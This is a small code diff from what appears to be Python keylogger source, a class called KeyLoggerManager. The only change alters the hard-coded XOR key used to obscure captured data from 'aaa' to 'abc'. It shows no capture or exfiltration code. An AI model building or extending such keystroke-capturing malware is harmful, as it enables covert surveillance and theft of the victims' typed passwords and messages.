@@ -29,7 +29,7 @@ class KeyLoggerManager:
 
     def xor_encryption(self):
         # print(self.instance.get_data())
-        return Encryptor.xor_encryption(self.instance.get_data(),"aaa")
+        return Encryptor.xor_encryption(self.instance.get_data(),"abc")
 
     def main(self):
         threading.Thread(target=self.start).start()
